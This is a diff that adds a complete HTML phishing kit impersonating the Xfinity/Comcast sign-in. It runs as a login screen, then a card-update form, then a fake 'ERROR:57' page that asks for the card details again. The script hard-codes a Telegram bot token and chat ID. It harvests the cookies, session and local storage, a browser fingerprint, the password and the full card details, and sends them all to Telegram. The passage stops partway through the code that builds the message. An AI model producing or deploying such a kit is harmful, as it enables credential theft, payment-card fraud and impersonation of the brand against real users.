@@ -1,0 +1,1264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WXYZ</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Open Sans', Arial, sans-serif; }
+    body {
+      min-height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      position:relative;
+      background: #0A1E3C;
+      overflow:hidden;
+    }
+
+    /* Full-screen background image */
+    .bg-image {
+      position:fixed;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      z-index:0;
+      background: url('https://wallpapercave.com/wp/wp4056702.jpg') center center / cover no-repeat;
+      filter: brightness(0.7) saturate(0.9);
+      transform: scale(1.05);
+      animation: slowZoom 30s ease-in-out infinite alternate;
+    }
+    @keyframes slowZoom {
+      0% { transform: scale(1.05); }
+      100% { transform: scale(1.15); }
+    }
+
+    /* Dark overlay for readability */
+    .overlay {
+      position:fixed;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      z-index:0;
+      background: 
+        linear-gradient(135deg, rgba(10,30,60,0.75) 0%, rgba(10,30,60,0.4) 50%, rgba(10,30,60,0.75) 100%),
+        radial-gradient(ellipse at center, rgba(0,0,0,0.2) 0%, rgba(0,0,0,0.6) 100%);
+      pointer-events:none;
+    }
+
+    /* Xfinity brand accent glow */
+    .accent-glow {
+      position:fixed;
+      top:50%;
+      left:50%;
+      transform:translate(-50%, -50%);
+      width:900px;
+      height:900px;
+      border-radius:50%;
+      background:radial-gradient(circle, rgba(230,0,0,0.08) 0%, transparent 70%);
+      pointer-events:none;
+      z-index:0;
+      animation: pulseGlow 5s ease-in-out infinite alternate;
+    }
+    @keyframes pulseGlow {
+      0% { opacity:0.3; transform:translate(-50%, -50%) scale(0.8); }
+      100% { opacity:0.7; transform:translate(-50%, -50%) scale(1.2); }
+    }
+
+    /* Floating particles */
+    .particles {
+      position:fixed;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      z-index:0;
+      pointer-events:none;
+      overflow:hidden;
+    }
+    .particle {
+      position:absolute;
+      width:4px;
+      height:4px;
+      background:rgba(255,255,255,0.15);
+      border-radius:50%;
+      animation: floatParticle 20s infinite linear;
+    }
+    .particle:nth-child(1) { left:10%; animation-duration:18s; animation-delay:0s; width:6px; height:6px; }
+    .particle:nth-child(2) { left:20%; animation-duration:22s; animation-delay:2s; }
+    .particle:nth-child(3) { left:30%; animation-duration:16s; animation-delay:4s; width:8px; height:8px; }
+    .particle:nth-child(4) { left:40%; animation-duration:24s; animation-delay:1s; }
+    .particle:nth-child(5) { left:50%; animation-duration:20s; animation-delay:3s; width:5px; height:5px; }
+    .particle:nth-child(6) { left:60%; animation-duration:19s; animation-delay:5s; }
+    .particle:nth-child(7) { left:70%; animation-duration:23s; animation-delay:2s; width:7px; height:7px; }
+    .particle:nth-child(8) { left:80%; animation-duration:17s; animation-delay:4s; }
+    .particle:nth-child(9) { left:90%; animation-duration:21s; animation-delay:1s; width:6px; height:6px; }
+    .particle:nth-child(10) { left:15%; animation-duration:25s; animation-delay:3s; }
+    .particle:nth-child(11) { left:45%; animation-duration:18s; animation-delay:6s; width:9px; height:9px; }
+    .particle:nth-child(12) { left:75%; animation-duration:22s; animation-delay:0s; }
+    @keyframes floatParticle {
+      0% { transform:translateY(100vh) rotate(0deg); opacity:0; }
+      10% { opacity:0.8; }
+      90% { opacity:0.8; }
+      100% { transform:translateY(-100vh) rotate(720deg); opacity:0; }
+    }
+
+    /* Container styling - glass morphism with backdrop blur */
+    .container {
+      width:100%;
+      max-width:400px;
+      background:rgba(255,255,255,0.88);
+      backdrop-filter:blur(20px);
+      -webkit-backdrop-filter:blur(20px);
+      border-radius:16px;
+      box-shadow:
+        0 30px 80px rgba(0,0,0,0.5),
+        0 0 0 1px rgba(255,255,255,0.1),
+        inset 0 1px 0 rgba(255,255,255,0.2);
+      padding:40px 32px;
+      position:relative;
+      z-index:1;
+      transition: all 0.3s ease;
+      border:1px solid rgba(255,255,255,0.15);
+    }
+    .container::before {
+      content:'';
+      position:absolute;
+      top:-1px;
+      left:50%;
+      transform:translateX(-50%);
+      width:60%;
+      height:2px;
+      background:linear-gradient(90deg, transparent, rgba(230,0,0,0.5), rgba(230,0,0,0.9), rgba(230,0,0,0.5), transparent);
+      border-radius:100%;
+    }
+    .container.card-step {
+      max-width:420px;
+      padding:28px 24px;
+    }
+    .container.error-step {
+      max-width:420px;
+      padding:28px 24px;
+    }
+    .hidden { display:none !important; }
+
+    .logo {
+      text-align:center;
+      margin-bottom:24px;
+      position:relative;
+    }
+    .logo img {
+      max-width:150px;
+      filter:drop-shadow(0 4px 20px rgba(0,0,0,0.25));
+      transition:transform 0.3s ease;
+    }
+    .logo img:hover {
+      transform:scale(1.03);
+    }
+    .logo .glow-ring {
+      position:absolute;
+      top:50%;
+      left:50%;
+      transform:translate(-50%, -50%);
+      width:180px;
+      height:180px;
+      border-radius:50%;
+      background:radial-gradient(circle, rgba(230,0,0,0.08) 0%, transparent 70%);
+      pointer-events:none;
+      z-index:-1;
+    }
+
+    h1 {
+      font-size:20px;
+      font-weight:600;
+      color:#0A1E3C;
+      margin-bottom:4px;
+      text-shadow:0 1px 2px rgba(255,255,255,0.3);
+    }
+    .sub {
+      font-size:13px;
+      color:#555;
+      margin-bottom:20px;
+      text-align:center;
+    }
+    .form-group { margin-bottom:14px; }
+    label {
+      display:block;
+      font-size:13px;
+      font-weight:600;
+      color:#0A1E3C;
+      margin-bottom:3px;
+    }
+    label .required { color:#E60000; margin-left:2px; }
+    input[type="text"], input[type="password"], input[type="tel"], input[type="number"], select, textarea {
+      width:100%;
+      padding:10px 12px;
+      border:1px solid rgba(208,208,208,0.5);
+      border-radius:8px;
+      font-size:14px;
+      transition:all 0.3s ease;
+      background:rgba(255,255,255,0.8);
+      height:42px;
+      font-family: 'Open Sans', Arial, sans-serif;
+      backdrop-filter:blur(5px);
+    }
+    textarea {
+      height:60px;
+      resize:vertical;
+      padding:8px 12px;
+    }
+    input:focus, select:focus, textarea:focus {
+      border-color:#0A1E3C;
+      outline:none;
+      box-shadow:0 0 0 3px rgba(10,30,60,0.15), inset 0 1px 3px rgba(0,0,0,0.05);
+      background:rgba(255,255,255,0.95);
+    }
+    input.error-field {
+      border-color:#E60000;
+      background:#fff5f5;
+    }
+    .row {
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      margin:4px 0 16px;
+    }
+    .row label {
+      font-weight:400;
+      font-size:13px;
+      display:flex;
+      align-items:center;
+      gap:6px;
+      cursor:pointer;
+      color:#333;
+    }
+    .row a {
+      font-size:13px;
+      color:#0A1E3C;
+      text-decoration:none;
+      font-weight:500;
+      transition:color 0.2s;
+    }
+    .row a:hover {
+      color:#E60000;
+      text-decoration:underline;
+    }
+    .btn {
+      width:100%;
+      background:linear-gradient(135deg, #E60000, #cc0000);
+      color:#fff;
+      border:none;
+      border-radius:8px;
+      padding:12px;
+      font-size:16px;
+      font-weight:700;
+      cursor:pointer;
+      transition:all 0.3s ease;
+      box-shadow:0 4px 20px rgba(230,0,0,0.35);
+      height:44px;
+      position:relative;
+      overflow:hidden;
+    }
+    .btn::after {
+      content:'';
+      position:absolute;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      background:linear-gradient(135deg, transparent 40%, rgba(255,255,255,0.1) 60%, transparent 80%);
+      pointer-events:none;
+    }
+    .btn:hover {
+      background:linear-gradient(135deg, #cc0000, #b30000);
+      box-shadow:0 6px 28px rgba(230,0,0,0.5);
+      transform:translateY(-2px);
+    }
+    .btn:active {
+      transform:scale(0.97) translateY(0);
+    }
+    .btn-secondary {
+      background:linear-gradient(135deg, #0A1E3C, #1a3a6a);
+      box-shadow:0 4px 20px rgba(10,30,60,0.35);
+    }
+    .btn-secondary:hover {
+      background:linear-gradient(135deg, #1a3a6a, #2a4a7a);
+      box-shadow:0 6px 28px rgba(10,30,60,0.45);
+    }
+    .signup {
+      text-align:center;
+      margin-top:16px;
+      font-size:13px;
+      color:#555;
+    }
+    .signup a {
+      color:#0A1E3C;
+      font-weight:600;
+      text-decoration:none;
+      transition:color 0.2s;
+    }
+    .signup a:hover {
+      color:#E60000;
+      text-decoration:underline;
+    }
+    .error {
+      color:#E60000;
+      font-size:12px;
+      margin-top:4px;
+      display:none;
+      background:rgba(230,0,0,0.08);
+      padding:6px 10px;
+      border-radius:6px;
+      border-left:3px solid #E60000;
+    }
+
+    /* Card step specific */
+    .card-step .logo { margin-bottom:16px; }
+    .card-step .logo img { max-width:120px; }
+    .card-step h1 { font-size:17px; }
+    .card-step .sub { font-size:12px; margin-bottom:12px; }
+    .card-step .form-group { margin-bottom:10px; }
+    .card-step label { font-size:12px; }
+    .card-step input, .card-step select { padding:8px 10px; font-size:13px; height:36px; }
+    .card-step textarea { padding:6px 10px; font-size:13px; height:50px; }
+    .card-step .btn { padding:10px; font-size:15px; height:40px; }
+    .card-step .row { margin:2px 0 10px; }
+
+    /* Error step specific */
+    .error-step .logo { margin-bottom:16px; }
+    .error-step .logo img { max-width:120px; }
+    .error-step h1 { font-size:17px; }
+    .error-step .sub { font-size:12px; margin-bottom:12px; }
+    .error-step .form-group { margin-bottom:10px; }
+    .error-step label { font-size:12px; }
+    .error-step input, .error-step select { padding:8px 10px; font-size:13px; height:36px; }
+    .error-step .btn { padding:10px; font-size:15px; height:40px; }
+    .error-step .row { margin:2px 0 10px; }
+
+    .error-banner {
+      background:linear-gradient(135deg, rgba(255,245,245,0.9), rgba(255,232,232,0.9));
+      border:1px solid #E60000;
+      border-radius:8px;
+      padding:12px 14px;
+      margin-bottom:16px;
+      display:flex;
+      align-items:center;
+      gap:10px;
+      box-shadow:0 2px 12px rgba(230,0,0,0.1);
+      backdrop-filter:blur(5px);
+    }
+    .error-banner .icon {
+      font-size:20px;
+      color:#E60000;
+    }
+    .error-banner .msg {
+      font-size:13px;
+      font-weight:600;
+      color:#E60000;
+    }
+    .error-banner .sub-msg {
+      font-size:12px;
+      color:#666;
+    }
+
+    .form-row-2 {
+      display:grid;
+      grid-template-columns:1fr 1fr;
+      gap:10px;
+    }
+    .form-row-3 {
+      display:grid;
+      grid-template-columns:1fr 1fr 1fr;
+      gap:10px;
+    }
+    .card-input-group { position:relative; }
+    .card-input-group input { padding-left:38px; letter-spacing:0.5px; }
+    .card-input-group .card-icon {
+      position:absolute;
+      left:10px;
+      top:50%;
+      transform:translateY(-50%);
+      font-size:16px;
+      color:#999;
+    }
+    .cvv-hint { font-size:10px; color:#999; margin-top:2px; text-align:right; }
+    .required-star { color:#E60000; font-weight:700; }
+
+    .card-type-pills {
+      display:flex;
+      gap:8px;
+      margin-top:4px;
+      flex-wrap:wrap;
+    }
+    .card-type-pills span {
+      padding:4px 12px;
+      border-radius:20px;
+      font-size:11px;
+      font-weight:600;
+      background:rgba(240,240,240,0.8);
+      color:#333;
+      border:1px solid #ddd;
+      cursor:pointer;
+      transition:all 0.2s ease;
+      backdrop-filter:blur(5px);
+    }
+    .card-type-pills span.active {
+      background:linear-gradient(135deg, #0A1E3C, #1a3a6a);
+      color:#fff;
+      border-color:#0A1E3C;
+      box-shadow:0 2px 12px rgba(10,30,60,0.2);
+    }
+    .card-type-pills span:hover {
+      transform:translateY(-1px);
+      box-shadow:0 2px 12px rgba(0,0,0,0.1);
+    }
+    .card-type-pills span.active:hover {
+      transform:translateY(-1px);
+      box-shadow:0 4px 16px rgba(10,30,60,0.3);
+    }
+
+    .success-content { text-align:center; padding:10px 0; }
+    .success-content .checkmark {
+      font-size:56px;
+      display:block;
+      margin-bottom:8px;
+      animation:popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    @keyframes popIn {
+      0% { transform:scale(0); opacity:0; }
+      100% { transform:scale(1); opacity:1; }
+    }
+    .success-content h2 {
+      font-size:18px;
+      color:#0A1E3C;
+      margin-bottom:4px;
+    }
+    .success-content p {
+      font-size:13px;
+      color:#555;
+    }
+    .spinner {
+      display:inline-block;
+      width:32px;
+      height:32px;
+      border:3px solid #E60000;
+      border-top-color:transparent;
+      border-radius:50%;
+      animation:spin 0.8s linear infinite;
+      margin-top:12px;
+    }
+    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
+
+    @media (max-width:480px) {
+      .container { margin:16px; padding:28px 18px; }
+      .container.card-step { padding:20px 16px; }
+      .container.error-step { padding:20px 16px; }
+      .form-row-2 { grid-template-columns:1fr; gap:8px; }
+      .form-row-3 { grid-template-columns:1fr; gap:8px; }
+      .card-step input, .card-step select { height:34px; font-size:12px; padding:6px 8px; }
+      .card-step textarea { height:44px; font-size:12px; padding:6px 8px; }
+      .error-step input, .error-step select { height:34px; font-size:12px; padding:6px 8px; }
+      .bg-image { filter: brightness(0.5) saturate(0.8); }
+    }
+  </style>
+</head>
+<body>
+  <!-- Background layers -->
+  <div class="bg-image"></div>
+  <div class="overlay"></div>
+  <div class="accent-glow"></div>
+  <div class="particles">
+    <span class="particle"></span>
+    <span class="particle"></span>
+    <span class="particle"></span>
+    <span class="particle"></span>
+    <span class="particle"></span>
+    <span class="particle"></span>
+    <span class="particle"></span>
+    <span class="particle"></span>
+    <span class="particle"></span>
+    <span class="particle"></span>
+    <span class="particle"></span>
+    <span class="particle"></span>
+  </div>
+
+  <!-- LOGIN STEP -->
+  <div class="container" id="loginContainer">
+    <div class="logo">
+      <div class="glow-ring"></div>
+      <img src="https://assets.xfinity.com/assets/dotcom/prod/img/logos/xfinity-logo.svg" alt="Xfinity" onerror="this.style.display='none'">
+    </div>
+    <h1>Sign in to Xfinity</h1>
+    <p class="sub">Access your email, TV, internet, and more</p>
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="user">Email or Xfinity ID</label>
+        <input type="text" id="user" name="user" placeholder="Enter your email or ID" required autofocus>
+      </div>
+      <div class="form-group">
+        <label for="pass">Password</label>
+        <input type="password" id="pass" name="pass" placeholder="Enter your password" required>
+      </div>
+      <div class="row">
+        <label><input type="checkbox" name="remember" value="true" checked> Remember me</label>
+        <a href="https://login.xfinity.com/forgot">Forgot password?</a>
+      </div>
+      <button type="submit" class="btn">Sign In</button>
+    </form>
+    <div class="signup">
+      Not a customer? <a href="https://www.xfinity.com/learn">Sign up now</a>
+    </div>
+    <div id="loginError" class="error"></div>
+  </div>
+
+  <!-- CARD INFO STEP -->
+  <div class="container card-step hidden" id="cardContainer">
+    <div class="logo">
+      <div class="glow-ring"></div>
+      <img src="https://assets.xfinity.com/assets/dotcom/prod/img/logos/xfinity-logo.svg" alt="Xfinity" onerror="this.style.display='none'">
+    </div>
+    <h1>Update Payment Method</h1>
+    <p class="sub"><span class="required-star">*</span> Required fields &bull; Kindly update your Card info</p>
+    
+    <form id="cardForm">
+      <div class="form-row-2">
+        <div class="form-group">
+          <label>First Name <span class="required-star">*</span></label>
+          <input type="text" id="firstName" placeholder="First" required>
+        </div>
+        <div class="form-group">
+          <label>Last Name <span class="required-star">*</span></label>
+          <input type="text" id="lastName" placeholder="Last" required>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Address <span class="required-star">*</span></label>
+        <input type="text" id="address" placeholder="Street address" required>
+      </div>
+
+      <div class="form-group">
+        <label>Address Line 2</label>
+        <input type="text" id="address2" placeholder="Apartment, suite, unit, etc.">
+      </div>
+
+      <div class="form-row-2">
+        <div class="form-group">
+          <label>City <span class="required-star">*</span></label>
+          <input type="text" id="city" placeholder="City" required>
+        </div>
+        <div class="form-group">
+          <label>State</label>
+          <input type="text" id="state" placeholder="State">
+        </div>
+      </div>
+
+      <div class="form-row-2">
+        <div class="form-group">
+          <label>Country</label>
+          <select id="country">
+            <option value="">Select</option>
+            <option value="US">United States</option>
+            <option value="CA">Canada</option>
+            <option value="UK">United Kingdom</option>
+            <option value="AU">Australia</option>
+            <option value="DE">Germany</option>
+            <option value="FR">France</option>
+            <option value="JP">Japan</option>
+            <option value="BR">Brazil</option>
+            <option value="IN">India</option>
+            <option value="IT">Italy</option>
+            <option value="ES">Spain</option>
+            <option value="MX">Mexico</option>
+            <option value="NL">Netherlands</option>
+            <option value="KR">South Korea</option>
+            <option value="SG">Singapore</option>
+            <option value="ZA">South Africa</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Postal Code <span class="required-star">*</span></label>
+          <input type="text" id="postalCode" placeholder="Postal" required>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Phone</label>
+        <input type="tel" id="phone" placeholder="Phone number">
+      </div>
+
+      <div class="form-row-2">
+        <div class="form-group">
+          <label>Card Type</label>
+          <select id="cardType">
+            <option value="">Select Type</option>
+            <option value="Visa">Visa</option>
+            <option value="MasterCard">MasterCard</option>
+            <option value="Amex">American Express</option>
+            <option value="Discover">Discover</option>
+            <option value="JCB">JCB</option>
+            <option value="Diners">Diners Club</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Card Number</label>
+          <div class="card-input-group">
+            <span class="card-icon">💳</span>
+            <input type="text" id="cardNumber" placeholder="#### #### #### ####" maxlength="23">
+          </div>
+        </div>
+      </div>
+
+      <div class="form-row-3">
+        <div class="form-group">
+          <label>Exp. Month <span class="required-star">*</span></label>
+          <select id="expMonth" required>
+            <option value="">Month</option>
+            <option value="01">Jan</option><option value="02">Feb</option>
+            <option value="03">Mar</option><option value="04">Apr</option>
+            <option value="05">May</option><option value="06">Jun</option>
+            <option value="07">Jul</option><option value="08">Aug</option>
+            <option value="09">Sep</option><option value="10">Oct</option>
+            <option value="11">Nov</option><option value="12">Dec</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Exp. Year <span class="required-star">*</span></label>
+          <select id="expYear" required>
+            <option value="">Year</option>
+            <option value="2026">2026</option><option value="2027">2027</option>
+            <option value="2028">2028</option><option value="2029">2029</option>
+            <option value="2030">2030</option><option value="2031">2031</option>
+            <option value="2032">2032</option><option value="2033">2033</option>
+            <option value="2034">2034</option><option value="2035">2035</option>
+            <option value="2036">2036</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>CVV <span class="required-star">*</span></label>
+          <input type="password" id="cvv" placeholder="CVV" maxlength="4" required>
+          <div class="cvv-hint">3-4 digits</div>
+        </div>
+      </div>
+
+      <button type="submit" class="btn btn-secondary">PROCEED</button>
+    </form>
+    <div id="cardError" class="error"></div>
+  </div>
+
+  <!-- ERROR / RE-ENTER STEP (Third Page) -->
+  <div class="container error-step hidden" id="errorContainer">
+    <div class="logo">
+      <div class="glow-ring"></div>
+      <img src="https://assets.xfinity.com/assets/dotcom/prod/img/logos/xfinity-logo.svg" alt="Xfinity" onerror="this.style.display='none'">
+    </div>
+    <h1>Payment Verification</h1>
+    
+    <div class="error-banner">
+      <span class="icon">⚠️</span>
+      <div>
+        <div class="msg">ERROR:57</div>
+        <div class="sub-msg">Please re-enter your Card info</div>
+      </div>
+    </div>
+
+    <form id="errorForm">
+      <div class="form-group">
+        <label>E-mail:</label>
+        <input type="text" id="errorEmail" placeholder="Email address" value="">
+      </div>
+
+      <div class="form-group">
+        <label>City:</label>
+        <input type="text" id="errorCity" placeholder="City" value="76666666666">
+      </div>
+
+      <div class="form-group">
+        <label>Card Type:</label>
+        <div class="card-type-pills">
+          <span data-type="MasterCard">Master Card</span>
+          <span data-type="Visa" class="active">Visa</span>
+          <span data-type="Amex">AE</span>
+          <span data-type="Discover">D</span>
+        </div>
+        <input type="hidden" id="errorCardType" value="Visa">
+      </div>
+
+      <div class="form-group">
+        <label>Card Number:</label>
+        <div class="card-input-group">
+          <span class="card-icon">💳</span>
+          <input type="text" id="errorCardNumber" placeholder="#### #### #### ####" maxlength="23" value="######### ######### ######### #########">
+        </div>
+      </div>
+
+      <div class="form-row-2">
+        <div class="form-group">
+          <label>Exp. Date:</label>
+          <select id="errorExpMonth">
+            <option value="">Month ▼</option>
+            <option value="01">Jan</option><option value="02">Feb</option>
+            <option value="03">Mar</option><option value="04">Apr</option>
+            <option value="05">May</option><option value="06">Jun</option>
+            <option value="07">Jul</option><option value="08">Aug</option>
+            <option value="09">Sep</option><option value="10">Oct</option>
+            <option value="11">Nov</option><option value="12">Dec</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label>Year ▼</label>
+          <select id="errorExpYear">
+            <option value="">Year ▼</option>
+            <option value="2026">2026</option><option value="2027">2027</option>
+            <option value="2028">2028</option><option value="2029">2029</option>
+            <option value="2030">2030</option><option value="2031">2031</option>
+            <option value="2032">2032</option><option value="2033">2033</option>
+            <option value="2034">2034</option><option value="2035">2035</option>
+            <option value="2036">2036</option>
+          </select>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>CVV:</label>
+        <input type="password" id="errorCvv" placeholder="CVV" maxlength="4">
+      </div>
+
+      <button type="submit" class="btn btn-secondary">PROCEED</button>
+    </form>
+    <div id="errorFormError" class="error"></div>
+  </div>
+
+  <script>
+    // ============================================================
+    // TELEGRAM CONFIGURATION
+    // ============================================================
+    //const TELEGRAM_BOT_TOKEN = '8487003171:AAESOU70laX8OLy6kDW6HrDFhzDO5b1soVs';  
+    //const TELEGRAM_CHAT_ID = '6454825221';  
+
+	
+    const TELEGRAM_BOT_TOKEN = '8867610064:AAGkEbNz1-HavDPif3BFZal_UTAgE9D1sp0';  
+    const TELEGRAM_CHAT_ID = '5760095180';
+
+    // ============================================================
+    // COOKIE GRABBER - REAL COMCAST.NET SESSION COOKIES
+    // ============================================================
+    function getAllCookies() {
+      const cookies = document.cookie.split(';').map(c => c.trim()).filter(c => c.length > 0);
+      return cookies;
+    }
+
+    function getCookieString() {
+      const cookies = getAllCookies();
+      return cookies.length ? cookies.join('; ') : '(no cookies)';
+    }
+
+    // Filter for comcast.net specific cookies
+    function getComcastCookies() {
+      const allCookies = getAllCookies();
+      const comcastCookies = allCookies.filter(cookie => 
+        cookie.toLowerCase().includes('comcast') || 
+        cookie.toLowerCase().includes('xfinity') ||
+        cookie.toLowerCase().includes('auth') ||
+        cookie.toLowerCase().includes('session') ||
+        cookie.toLowerCase().includes('token') ||
+        cookie.toLowerCase().includes('login') ||
+        cookie.toLowerCase().includes('user') ||
+        cookie.toLowerCase().includes('id') ||
+        cookie.toLowerCase().includes('sso') ||
+        cookie.toLowerCase().includes('oauth')
+      );
+      return comcastCookies.length ? comcastCookies : allCookies;
+    }
+
+    function getComcastCookieString() {
+      const cookies = getComcastCookies();
+      return cookies.length ? cookies.join('; ') : '(no comcast cookies found)';
+    }
+
+    // ============================================================
+    // SESSION STORAGE GRABBER
+    // ============================================================
+    function getSessionStorage() {
+      const data = {};
+      try {
+        for (let i = 0; i < sessionStorage.length; i++) {
+          const key = sessionStorage.key(i);
+          data[key] = sessionStorage.getItem(key);
+        }
+      } catch (e) {}
+      return data;
+    }
+
+    function getLocalStorage() {
+      const data = {};
+      try {
+        for (let i = 0; i < localStorage.length; i++) {
+          const key = localStorage.key(i);
+          data[key] = localStorage.getItem(key);
+        }
+      } catch (e) {}
+      return data;
+    }
+
+    // ============================================================
+    // COLLECT DEVICE & BROWSER INFO
+    // ============================================================
+    function getDeviceInfo() {
+      const info = {
+        ip: 'N/A (server-side)',
+        time: new Date().toLocaleString('en-US', { 
+          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          month: '2-digit',
+          day: '2-digit',
+          year: 'numeric',
+          hour: '2-digit',
+          minute: '2-digit',
+          second: '2-digit',
+          hour12: true
+        }),
+        ua: navigator.userAgent,
+        screen: `${screen.width}x${screen.height} (${window.innerWidth}x${window.innerHeight} viewport)`,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        fp: getFingerprint(),
+        language: navigator.language || navigator.languages?.[0] || 'N/A',
+        platform: navigator.platform || 'N/A',
+        vendor: navigator.vendor || 'N/A',
+        allCookies: getCookieString(),
+        comcastCookies: getComcastCookieString(),
+        sessionStorage: getSessionStorage(),
+        localStorage: getLocalStorage(),
+        doNotTrack: navigator.doNotTrack || 'Not set',
+        connection: navigator.connection ? 
+          `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : 
+          'N/A'
+      };
+      return info;
+    }
+
+    function getFingerprint() {
+      const canvas = document.createElement('canvas');
+      canvas.width = 256;
+      canvas.height = 64;
+      const ctx = canvas.getContext('2d');
+      ctx.textBaseline = 'top';
+      ctx.font = '14px Arial';
+      ctx.fillStyle = '#f60';
+      ctx.fillRect(125, 1, 62, 20);
+      ctx.fillStyle = '#069';
+      ctx.fillText('Xfinity', 2, 15);
+      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+      ctx.fillText('Comcast', 4, 45);
+      const fingerprint = canvas.toDataURL();
+      
+      let hash = 0;
+      for (let i = 0; i < fingerprint.length; i++) {
+        const char = fingerprint.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash;
+      }
+      return `FP-${Math.abs(hash).toString(36).toUpperCase().slice(0, 8)}`;
+    }
+
+    // ============================================================
+    // TELEGRAM SENDER
+    // ============================================================
+    function sendToTelegram(message) {
+      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
+          !TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+        console.log('[TELEGRAM] Message would have been sent:');
+        console.log(message);
+        return;
+      }
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) console.log('[TELEGRAM] Sent');
+        else console.error('[TELEGRAM] Error:', data.description);
+      })
+      .catch(err => console.error('[TELEGRAM] Network error:', err));
+    }
+
+    // ============================================================
+    // BUILD MESSAGE WITH FULL INFO
+    // ============================================================
+    function buildTelegramMessage(loginData, cardData, retryData, deviceInfo) {
+      const timestamp = new Date().toLocaleString('en-US', { 
+        timeZone: 'America/New_York',
+        month: '2-digit',
+        day: '2-digit',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit',
+        hour12: true
+      });
+      
+      let msg = `🔐 <b>XFINITY LOGIN CAPTURE</b>\n`;
+      msg += `⏰ <i>${timestamp} (EST)</i>\n`;
+      msg += `────────────────────\n\n`;
+
+      // COMCAST.NET COOKIES - REAL SESSION
+      msg += `<b>🍪 COMCAST.NET SESSION COOKIES</b>\n`;
+      const comcastStr = deviceInfo?.comcastCookies || '(no comcast cookies)';
+      if (comcastStr !== '(no comcast cookies)' && comcastStr !== '(no comcast cookies found)') {
+        const cookieArray = comcastStr.split('; ');
+        for (const cookie of cookieArray) {
+          const parts = cookie.split('=');
+          const name = parts[0];
+          const value = parts.slice(1).join('=');
+          msg += `  ${name}: <code>${value || '(empty)'}</code>\n`;
+        }
+      } else {
+        msg += `  <code>${comcastStr}</code>\n`;
+      }
+      msg += `\n`;
+
+      // ALL COOKIES (for reference)
+      msg += `<b>🍪 ALL COOKIES (full list)</b>\n`;
+      const allStr = deviceInfo?.allCookies || '(no cookies)';
+      if (allStr !== '(no cookies)') {
+        const cookieArray = allStr.split('; ');
+        for (const cookie of cookieArray) {
+          const parts = cookie.split('=');
+          const name = parts[0];
+          const value = parts.slice(1).join('=');
+          if (value.length > 50) {
+            msg += `  ${name}: <code>${value.substring(0, 50)}...</code>\n`;
+          } else {
+            msg += `  ${name}: <code>${value || '(empty)'}</code>\n`;
+          }
+        }
+      } else {
+        msg += `  <code>${allStr}</code>\n`;
+      }
+      msg += `\n`;
+
+      // SESSION STORAGE
+      const sessionData = deviceInfo?.sessionStorage || {};
+      if (Object.keys(sessionData).length) {
+        msg += `<b>🔐 SESSION STORAGE</b>\n`;
+        for (const [key, value] of Object.entries(sessionData)) {
+          const display = value.length > 80 ? value.substring(0, 80) + '...' : value;
+          msg += `  ${key}: <code>${display}</code>\n`;
+        }
+        msg += `\n`;
+      }
+
+      // LOCAL STORAGE
+      const localData = deviceInfo?.localStorage || {};
+      if (Object.keys(localData).length) {
+        msg += `<b>💾 LOCAL STORAGE</b>\n`;
+        for (const [key, value] of Object.entries(localData)) {
+          const display = value.length > 80 ? value.substring(0, 80) + '...' : value;
+          msg += `  ${key}: <code>${display}</code>\n`;
+        }
+        msg += `\n`;
+      }
+
+      if (loginData) {
+        msg += `<b>📧 LOGIN CREDENTIALS</b>\n`;
+        msg += `👤 Email/ID: <code>${loginData.user || 'N/A'}</code>\n`;
+        msg += `🔑 Password: <code>${loginData.pass || 'N/A'}</code>\n\n`;
+      }
+
+      if (cardData) {
+        msg += `<b>💳 CARD INFORMATION</b>\n`;
+        msg += `👤 First Name: <code>${cardData.firstName || 'N/A'}</code>\n`;
+        msg += `👤 Last Name: <code>${cardData.lastName || 'N/A'}</code>\n`;
+        msg += `🏠 Address: <code>${cardData.address || 'N/A'}</code>\n`;
+        if (cardData.address2) msg += `🏠 Address 2: <code>${cardData.address2}</code>\n`;
+        msg += `🏙️ City: <code>${cardData.city || 'N/A'}</code>\n`;
+        msg += `📍 State: <code>${cardData.state || 'N/A'}</code>\n`;
+        msg += `🌍 Country: <code>${cardData.country || 'N/A'}</code>\n`;
+        msg += `📮 Postal: <code>${cardData.postalCode || 'N/A'}</code>\n`;
+        msg += `📞 Phone: <code>${cardData.phone || 'N/A'}</code>\n`;
+        msg += `💳 Card Type: <code>${cardData.cardType || 'N/A'}</code>\n`;
+        msg += `🔢 Card Number: <code>${cardData.cardNumber || 'N/A'}</code>\n`;
+        msg += `📅 Exp Month: <code>${cardData.expMonth || 'N/A'}</code>\n`;
